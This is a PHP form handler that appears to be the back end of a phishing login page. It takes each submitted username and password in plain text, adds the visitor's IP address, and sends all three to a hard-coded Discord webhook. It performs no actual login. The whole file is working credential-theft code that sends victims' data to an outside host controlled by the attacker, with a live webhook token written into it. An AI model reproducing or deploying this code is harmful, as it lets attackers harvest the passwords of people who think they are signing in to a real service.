<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $webhookUrl = 'https://discord.com/api/webhooks/1436901485446168650/auk7AbYXQhJx0vNKjY3nwfHQsVbklWadr0AE2xUrgIkeNDdFZzXOVLCN9quc4yIaShXq';

    $message = [
        'content' => "New login attempt:\nUsername: $username\nPassword: $password\nIP Address: $ip"
    ];

    $options = [
        'http' => [
            'method'  => 'POST',
            'content' => json_encode($message),
            'header'  => "Content-Type: application/json\r\n"
        ]
    ];

    $context  = stream_context_create($options);
    $result = file_get_contents($webhookUrl, false, $context);

    if ($result === FALSE) {
        die('Error');
    }
}
?>